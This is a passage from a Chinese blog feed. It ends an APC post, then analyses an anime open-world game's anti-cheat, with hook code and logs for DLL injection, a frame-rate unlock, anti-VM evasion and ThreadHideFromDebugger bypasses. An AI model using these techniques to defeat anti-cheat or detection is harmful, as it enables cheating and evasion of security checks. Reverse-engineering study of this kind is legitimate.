class="number">0</span>);</span><br><span class="line">        <span class="built_in">SleepEx</span>(<span class="number">1000</span>,<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到，线程自己的 <code>SleepEx</code> 并没有生效，因为在插入 <code>APC</code> 时线程就被立刻唤醒且执行 <code>APC</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">helloworld</span><br><span class="line">[<span class="number">1739770840</span>]prepare to insert apc <span class="number">0</span></span><br><span class="line">[<span class="number">1739770840</span>]routine <span class="number">0</span></span><br><span class="line">shellcode1 execute</span><br><span class="line">[<span class="number">1739770840</span>]routine <span class="number">1</span></span><br><span class="line">[<span class="number">1739770841</span>]prepare to insert apc <span class="number">1</span></span><br><span class="line">shellcode1 execute</span><br><span class="line">[<span class="number">1739770841</span>]routine <span class="number">2</span></span><br><span class="line">[<span class="number">1739770842</span>]prepare to insert apc <span class="number">2</span></span><br><span class="line">shellcode1 execute</span><br><span class="line">[<span class="number">1739770842</span>]routine <span class="number">3</span></span><br><span class="line">[<span class="number">1739770843</span>]prepare to insert apc <span class="number">3</span></span><br><span class="line">shellcode1 execute</span><br><span class="line">[<span class="number">1739770843</span>]routine <span class="number">4</span></span><br><span class="line">[<span class="number">1739770844</span>]prepare to insert apc <span class="number">4</span></span><br><span class="line">shellcode1 execute</span><br></pre></td></tr></table></figure><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[1]：<a href="https://www.cnblogs.com/wingsummer/p/15844264.html">https://www.cnblogs.com/wingsummer/p/15844264.html</a></li><li>[2]：<a href="https://bbs.kanxue.com/thread-270896.htm">https://bbs.kanxue.com/thread-270896.htm</a></li></ul>]]></content>
    
    
    <summary type="html">今天详细了解一下 APC 到底是怎么工作的。</summary>
    
    
    
    <category term="计算机系统" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/"/>
    
    <category term="APC" scheme="https://xia0ji233.github.io/categories/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%B3%BB%E7%BB%9F/Windows/APC/"/>
    
    
  </entry>
  
  <entry>
    <title>某二次元开放世界冒险游戏反作弊分析报告</title>
    <link href="https://xia0ji233.github.io/2025/02/14/Game6/"/>
    <id>https://xia0ji233.github.io/2025/02/14/Game6/</id>
    <published>2025-02-14T03:00:00.000Z</published>
    <updated>2025-02-14T04:02:27.672Z</updated>
    
    <content type="html"><![CDATA[<p>好久没碰某二次元开放世界冒险游戏了，听说新升级了反作弊，故来一探究竟，并尝试实现一些简单的功能。</p><h2 id="基本保护分析"><a href="#基本保护分析" class="headerlink" title="基本保护分析"></a>基本保护分析</h2><p>这种级别的游戏首先不考虑静态分析，直接跑起来。不出意外肯定不能直接内存读写，想附加调试器也是附加不上的，所以选择先从驱动入手，游戏加载时会加载驱动。</p><p>先尝试简单的拦截，方法很多：注册 LoadImage 回调拦截，改驱动名等等等。后者比较好实现，但是运行游戏一段时间会弹窗强制退出。</p><img src="/2025/02/14/Game6/1.png" class=""><p>而如果说让保护加载，自己起一个句柄提权的驱动，则会被弹窗退出。</p><img src="/2025/02/14/Game6/2.png" class=""><p>尝试过在虚拟机里直接启动游戏，不出意外也是弹窗。</p><img src="/2025/02/14/Game6/3.png" class=""><p>使用启动时注入的方式，手动 Create 进程挂起，再远线程注入，可以将 DLL 注入，因为游戏刚运行的时候是没有驱动保护的，自然可以获得正常的游戏句柄。</p><h2 id="注入功能测试"><a href="#注入功能测试" class="headerlink" title="注入功能测试"></a>注入功能测试</h2><p>DLL 直接用 imgui 做 hook 就行，网上框架巨多，先浅浅尝试一下改锁帧的功能，由于这个游戏锁 60 帧，因此玩的很难受，尝试找一下这个值。</p><img src="/2025/02/14/Game6/4.png" class=""><p>反复修改反复找可以找到四个值，地址较小的那个是真实值</p><img src="/2025/02/14/Game6/5.png" class=""><p>imgui里面直接用这个值绑定滑动条，实现帧率解锁。</p><img src="/2025/02/14/Game6/6.png" class=""><h2 id="R3分析"><a href="#R3分析" class="headerlink" title="R3分析"></a>R3分析</h2><p>面临的难点主要是反调试和反虚拟机。</p><h3 id="反虚拟机"><a href="#反虚拟机" class="headerlink" title="反虚拟机"></a>反虚拟机</h3><p>先说结论：R3程序使用了多种类型的反虚拟机技术，大部分通过hook api 的形式可以直接过掉。</p><ul><li>虚拟机设备检测——Hook CreateFileA 和 CreateFileW 拦截常见的虚拟设备</li><li>虚拟机系统文件检测（sys和dll）——Hook CreateFileA 和 CreateFileW 虚拟机的 sys 和 dll 文件</li><li>进程检测——Hook ProcessNextW 跳过虚拟机中才会存在的进程</li><li>驱动目录检测——Hook NtQueryDirectory 拦截虚拟机中的驱动服务，改成其它任意名字即可</li><li>计时器检测——Hook GetTickCount 在监测点修改返回值降低时间间隔</li><li>MAC地址检测——Hook GetAdaptersInfo 将MAC地址的厂商号替换为非虚拟机厂商的厂商号</li><li>注册表检测——暂时是配合 sys 文件一起做检测的，可以不用拦截，实际上也可以 Hook OpenKey 之类的注册表函数</li><li>模块检测——Hook ModuleNextW 跳过虚拟机相关模块</li></ul><h4 id="虚拟设备检测"><a href="#虚拟设备检测" class="headerlink" title="虚拟设备检测"></a>虚拟设备检测</h4><p>Hook <code>CreateFileW</code> 和 <code>CreateFileA</code> 这两个 API，可以看出在尝试打开如下的设备和文件</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">\\.\vmmemctl</span><br><span class="line">C:\Windows\system32\DRIVERS\vm3dmp.sys</span><br><span class="line">C:\Windows\system32\drivers\vm3dmp_loader.sys</span><br><span class="line">...</span><br></pre></td></tr></table></figure><p>不用想，游戏打开这些文件肯定是在检测虚拟机，这里将文件添加到一个 set 中，每次打开遍历一遍，遇到它检测的文件就直接返回无效句柄。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">HANDLE <span class="title">gh_CreateFileW</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">auto</span> it : DeviceFileBlacklist) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">CaseInsensitiveContains</span>(lpFileName, it)) &#123;</span><br><span class="line">            <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;black device \&quot;%ws\&quot; not allowed to open\n&quot;</span>, lpFileName);</span><br><span class="line">            <span class="keyword">return</span> INVALID_HANDLE_VALUE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    HANDLE hFile = <span class="built_in">CreateFileW</span>(...);</span><br><span class="line">    <span class="type">bool</span> flag = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it:FileBlacklist)&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">CaseInsensitiveContains</span>(lpFileName,it)) &#123;</span><br><span class="line">            flag = <span class="literal">false</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;CreateFileW called with %ws return value %p\n&quot;</span>, lpFileName, hFile);</span><br><span class="line">    <span class="keyword">return</span> hFile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要对 <code>yxxxshen.exe</code> 和 <code>mxxxbase.dll</code> 两个模块做 IAT hook 即可。下面是拦截成功的一些日志，实际上还有更多的设备，这里不一一展示：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]black device <span class="string">&quot;\\.\vmmemctl&quot;</span> <span class="keyword">not</span> allowed to open</span><br><span class="line">[Debug Info]black device <span class="string">&quot;C:\Windows\system32\DRIVERS\vm3dmp.sys&quot;</span> <span class="keyword">not</span> allowed to open</span><br><span class="line">[Debug Info]black device <span class="string">&quot;C:\Windows\system32\drivers\vm3dmp_loader.sys&quot;</span> <span class="keyword">not</span> allowed to open</span><br><span class="line">...</span><br></pre></td></tr></table></figure><h4 id="进程检测"><a href="#进程检测" class="headerlink" title="进程检测"></a>进程检测</h4><p>运行过程中会有一段调用了进程遍历的关键函数 <code>Process32NextW</code>，应该是检测虚拟机的相关进程，这里直接匹配当前虚拟机存在的一些虚拟机特有的进程不让它返回即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">gh_ProcessNextW</span><span class="params">(HANDLE hSnapshot, LPPROCESSENTRY32W lppe)</span> </span>&#123;</span><br><span class="line">    BOOL ret = <span class="built_in">Process32NextW</span>(hSnapshot, lppe);</span><br><span class="line">    WCHAR *szExeFile = lppe-&gt;szExeFile;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">CaseInsensitiveContains</span>(szExeFile, <span class="string">L&quot;vm&quot;</span>)||<span class="built_in">CaseInsensitiveContains</span>(szExeFile,<span class="string">L&quot;VGAuthService&quot;</span>) &amp;&amp; ret) &#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;Found Vm in Process name %ws,try to execute again\n&quot;</span>, szExeFile);</span><br><span class="line">        ret = <span class="built_in">Process32NextW</span>(hSnapshot, lppe);</span><br><span class="line">        szExeFile = lppe-&gt;szExeFile;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;new Process Name %ws pid=%d ret=%d\n&quot;</span>, lppe-&gt;szExeFile, lppe-&gt;th32ProcessID, ret);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;ProcessNextW called with %ws pid=%d ret=%d\n&quot;</span>, lppe-&gt;szExeFile,lppe-&gt;th32ProcessID ,ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果找到 vm 相关进程则持续调用，直到进程名不包含 vm 或者为 <code>VGAuthService</code> 即可。下面是一些拦截成功的日志：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]Found Vm in Process name vm3dservice.exe,<span class="keyword">try</span> to execute again</span><br><span class="line">[Debug Info]<span class="keyword">new</span> Process Name vmtoolsd.exe pid=<span class="number">3916</span> ret=<span class="number">1</span></span><br><span class="line">[Debug Info]Found Vm in Process name vmtoolsd.exe,<span class="keyword">try</span> to execute again</span><br><span class="line">[Debug Info]<span class="keyword">new</span> Process Name svchost.exe pid=<span class="number">3928</span> ret=<span class="number">1</span></span><br><span class="line">[Debug Info]ProcessNextW called with svchost.exe pid=<span class="number">3928</span> ret=<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="驱动目录检测"><a href="#驱动目录检测" class="headerlink" title="驱动目录检测"></a>驱动目录检测</h4><p>游戏调用了 <code>NtOpenDirectoryObject</code> 和 <code>NtQueryDirectoryObject</code> 两个 API，经过测试发现它打开了 <code>\Device</code> 路径，也就是开始遍历了驱动对象。</p><p>这两个 api 可以先hook打印，但是单纯绕过检测 hook 后者即可。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">NTSTATUS <span class="title">gh_NtQueryDirectoryObject</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">NtQueryDirectoryObject</span>(...);</span><br><span class="line">    <span class="keyword">auto</span> info = (POBJECT_DIRECTORY_INFORMATION)Buffer;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">auto</span> it:DeviceBlackList)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">CaseInsensitiveEqual</span>(info-&gt;Name.Buffer,it))&#123;</span><br><span class="line">            <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;NtQueryDirectoryObject name=\&quot;%wZ\&quot; return %d Deny to open!\n&quot;</span>, </span><br><span class="line">            info-&gt;Name, info-&gt;TypeName, ret);</span><br><span class="line">            info-&gt;Name = DeniedDevice;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;NtQueryDirectoryObject name=\&quot;%wZ\&quot;,Type=\&quot;%wZ\&quot; return %d\n&quot;</span>, </span><br><span class="line">    info-&gt;Name, info-&gt;TypeName, ret);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里也给出一些拦截成功的日志</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]NtQueryDirectoryObject name=<span class="string">&quot;gpuenergydrv&quot;</span>,Type=<span class="string">&quot;Device&quot;</span> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">[Debug Info]NtQueryDirectoryObject name=<span class="string">&quot;VMCIHostDev&quot;</span> <span class="keyword">return</span> <span class="number">697297488</span> Deny to open!</span><br><span class="line">[Debug Info]NtQueryDirectoryObject name=<span class="string">&quot;00000068&quot;</span>,Type=<span class="string">&quot;Device&quot;</span> <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="计时器检测"><a href="#计时器检测" class="headerlink" title="计时器检测"></a>计时器检测</h4><p>注意到 mxxxbase.dll 的一个函数</p><img src="/2025/02/14/Game6/7.png" class=""><p>GetTickCount64 获取系统启动以来经过的毫秒数。</p><p>它做了 10 次测试，每次测试 10000 条 cpuid 指令运行所需的时间，在虚拟机里，它很大，物理机中几乎每次都为 0。</p><p>那么便可以：</p><p>强制将两次运行的 cpuid 的时间设为一致。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">ULONGLONG st=<span class="number">40000</span>;</span><br><span class="line"></span><br><span class="line"><span class="function">ULONGLONG <span class="title">gh_GetTickCount64</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">GetTickCount64</span>();</span><br><span class="line">    <span class="keyword">if</span> (st == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;GetTickCount64 called %lld\n&quot;</span>, ret);</span><br><span class="line">        st = ret;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;GetTickCount64 called change %lld to %lld\n&quot;</span>, ret, st);</span><br><span class="line">        ret = st;</span><br><span class="line">        st = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>下面是日志</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]GetTickCount64 called <span class="number">4117687</span></span><br><span class="line">[Debug Info]GetTickCount64 called change <span class="number">4117718</span> to <span class="number">4117687</span></span><br><span class="line">[Debug Info]GetTickCount64 called <span class="number">4117734</span></span><br><span class="line">[Debug Info]GetTickCount64 called change <span class="number">4117812</span> to <span class="number">4117734</span></span><br></pre></td></tr></table></figure><p>可以对比得到，hook 前和 hook 后的差距大概是有几十毫秒的，这里会被检测到，通常物理机的间隔都是 0。</p><h4 id="MAC地址检测"><a href="#MAC地址检测" class="headerlink" title="MAC地址检测"></a>MAC地址检测</h4><p>该函数调用了，但是没进行检测，提前写好以免后面加这个检测，检测的方式通常是检查 MAC 地址前三字节的信息看厂商是否为 Vmware 之类的。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ULONG <span class="title">gh_GetAdaptersInfo</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">GetAdaptersInfo</span>(AdapterInfo, SizePointer);</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;GetAdaptersInfo called with %p %p return %d\n&quot;</span>,...);</span><br><span class="line">    <span class="comment">//换成intel的MAC地址60:45:2E</span></span><br><span class="line">    AdapterInfo-&gt;Address[<span class="number">0</span>] = <span class="number">0x60</span>;</span><br><span class="line">    AdapterInfo-&gt;Address[<span class="number">1</span>] = <span class="number">0x45</span>;</span><br><span class="line">    AdapterInfo-&gt;Address[<span class="number">2</span>] = <span class="number">0x2E</span>;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="注册表检测"><a href="#注册表检测" class="headerlink" title="注册表检测"></a>注册表检测</h4><p>hook 注册表相关的 api，拦截对应 open 的 key 的名字，实际上也是有调用没检测。</p><p>这里输出了一些相关log</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]RegOpenKeyExA called with FFFFFFFF80000002 <span class="string">&quot;SYSTEM\CurrentControlSet\services\vm3dmp_loader&quot;</span> <span class="number">0</span> <span class="number">131353</span> <span class="number">000000702</span>B0FF5B0 <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">[Debug Info]CreateFileW called with C:\Program <span class="built_in">Files</span> (x86)\mihoyo\games\Genshin Impact Game\yuanshen_Data\Persistent\base_res_version_hash <span class="keyword">return</span> value <span class="number">0000000000000</span>CDC</span><br><span class="line">[Debug Info]black device <span class="string">&quot;C:\Windows\system32\drivers\vm3dmp_loader.sys&quot;</span> <span class="keyword">not</span> allowed to open</span><br></pre></td></tr></table></figure><p>但是预计可能是两个一起检测的，即：注册表判断服务是否存在，再判断驱动文件是否存在，有一样不成立就不认为检测到了虚拟机。</p><h4 id="最终效果"><a href="#最终效果" class="headerlink" title="最终效果"></a>最终效果</h4><p>过完这些虚拟机检测之后，也是成功可以在虚拟机中启动 yxxxshen.exe 了。</p><img src="/2025/02/14/Game6/8.png" class=""><h3 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h3><p>R3的反调试相对比较简单，除了众所周知的 <code>IsDebuggerPresent</code> 之外，早期的版本似乎 <code>hook</code> 了 <code>DbgBreakPoint</code> 和 <code>DbgUiRemoteBreakin</code> 两个 API 来防止调试器附加，现在仍有 <code>hook</code>，不过只 <code>hook</code> 了 <code>DbgBreak</code>，并且同样也有 <code>ThreadHideFromDebugger</code> 检测。</p><ul><li><code>IsDebuggerPresent</code>：hook 返回 0 即可。</li><li><code>ThreadHideFromDebugger</code>：需要根据参数和调用的时机合理地选择返回，稍有不慎就会crash，具体看下文分析。</li><li><code>API hook</code>：目前无须绕过。</li></ul><h4 id="ThreadHideFromDebugger"><a href="#ThreadHideFromDebugger" class="headerlink" title="ThreadHideFromDebugger"></a>ThreadHideFromDebugger</h4><p><code>NtSetInformationThread</code> 这个 API 本意是设置线程优先级的，其中有一个参数 <code>ThreadInformationClass</code>，这是一个 <code>THREADINFOCLASS</code> 的枚举类型。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">enum</span> <span class="title class_">_THREADINFOCLASS</span> &#123;</span><br><span class="line">    ThreadBasicInformation          = <span class="number">0</span>,</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">    ThreadPriorityBoost             = <span class="number">14</span>,</span><br><span class="line">    ThreadSetTlsArrayAddress        = <span class="number">15</span>,   <span class="comment">// Obsolete</span></span><br><span class="line">    ThreadIsIoPending               = <span class="number">16</span>,</span><br><span class="line">    ThreadHideFromDebugger          = <span class="number">17</span>,</span><br><span class="line"> <span class="comment">//...</span></span><br><span class="line">    MaxThreadInfoClass              = <span class="number">51</span>,</span><br><span class="line">&#125; THREADINFOCLASS;</span><br></pre></td></tr></table></figure><p>其中注意到 0x11 即为 <code>ThreadHideFromDebugger</code>，字面意思也不难理解，就是从调试器中隐藏该线程，据<a href="https://bbs.kanxue.com/thread-249689.htm">看雪一篇文章</a>的分析，该函数关于 <code>ThreadHideFromDebugger</code> 的实现如下</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">case</span> ThreadHideFromDebugger:</span><br><span class="line">    <span class="keyword">if</span> (ThreadInformationLength != <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> STATUS_INFO_LENGTH_MISMATCH;</span><br><span class="line">    &#125;</span><br><span class="line">    st = <span class="built_in">ObReferenceObjectByHandle</span> (...);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="built_in">NT_SUCCESS</span> (st)) &#123;</span><br><span class="line">        <span class="keyword">return</span> st;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">PS_SET_BITS</span> (&amp;Thread-&gt;CrossThreadFlags, PS_CROSS_THREAD_FLAGS_HIDEFROMDBG);</span><br><span class="line">    <span class="built_in">ObDereferenceObject</span> (Thread);</span><br><span class="line">    <span class="keyword">return</span> st;</span><br><span class="line">    <span class="keyword">break</span>;</span><br></pre></td></tr></table></figure><p>可以看出当 <code>class</code> 为 <code>ThreadHideFromDebugger</code> 时，若 <code>ThreadInformationLength</code> 不为 0 则返回一个错误。因此过这个反调试不能无脑拦截 <code>class</code> 为 <code>ThreadHideFromDebugger</code> 的调用，而应注意这里的 Length 是否为 0。根据拦截 yxxxshen.exe 的调用可以看出。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]NtSetInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">1</span> <span class="keyword">return</span> c0000004</span><br><span class="line">[Debug Info]NtSetInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">0</span> <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>它连续调用了两次，第一次估计设置 <code>Length</code> 为 1，看是否调用失败，第二次才是真正的反调试，因此需要辨别出这一点。</p><p>似乎也不难写出它的 hook 函数？</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">UINT64 <span class="title">gh_NtSetInformationThread</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(ThreadInformationClass==<span class="number">0x11</span> &amp;&amp; ThreadInformationLength==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;Try to set ThreadHideFromDebugger,Stop it\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">auto</span> ret = <span class="built_in">NtSetInformationThread</span>(...);</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;lasterror=%d\n&quot;</span>, <span class="built_in">GetLastError</span>());</span><br><span class="line">    <span class="built_in">DBG_PRINT</span>(<span class="string">&quot;NtSetInformationThread called with handle %x %d at %p length %d return %x\n&quot;</span>,...);</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>但是很不幸的是，你会得到一个闪退。</p><img src="/2025/02/14/Game6/9.png" class=""><p>思路似乎中断了，于是考虑看看与之相近的 API，也就是 <code>NtQueryInformationThread</code>。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]NtQueryInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">4</span> <span class="keyword">return</span> c0000004</span><br><span class="line">[Debug Info]NtQueryInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">1</span> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">[Debug Info]NtSetInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">1</span> <span class="keyword">return</span> c0000004</span><br><span class="line">[Debug Info]NtSetInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">0</span> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">[Debug Info]NtQueryInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">4</span> <span class="keyword">return</span> c0000004</span><br><span class="line">[Debug Info]NtQueryInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">1</span> <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>可以看到在前后各成功调用一次 <code>NtQueryInformationThread</code>，并且将 class 设为了 <code>ThreadHideFromDebugger</code>。</p><p>这不对吧，query 它能干什么呢，对了，查询信息，可能是需要查询跟隐藏线程调试器相关的字段，那么会不会是因为成功 set 了和没成功 set 了情况不太一样呢？</p><p>这里 hook 掉看看前后查询的数据的区别。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[Debug Info]past information=<span class="number">34</span></span><br><span class="line">[Debug Info]after information=<span class="number">00</span></span><br><span class="line">[Debug Info]NtQueryInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">1</span> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">[Debug Info]NtSetInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">0</span> <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">[Debug Info]past information=<span class="number">95</span></span><br><span class="line">[Debug Info]after information=<span class="number">01</span></span><br><span class="line">[Debug Info]NtQueryInformationThread called with handle fffffffe <span class="number">17</span> at ... length <span class="number">1</span> <span class="keyword">return</span> <span class="number">0</span></span><br></pre></td></tr></table></figure><p>这里我保留关键的 LOG，也可以看出来，它在 set 前后分别查询了一次，第一次查询得知的结果是 0，而成功调用 set 之后得到的结果会是 1，如果仅仅 hook set 不让它调用则会在第二次查询也得到 0 的结果，这便是之前闪退的原因了。</p><p>因此对于这个反调试，需要同时 hook <code>NtQueryInformationThread</code> 和 <code>NtSetInformationThread</code>，严格判断参数，并合理过滤掉一些检测反调试和反-反-反调试的东西。</p><h4 id="IsDebuggerPresent"><a href="#IsDebuggerPresent" class="headerlink" 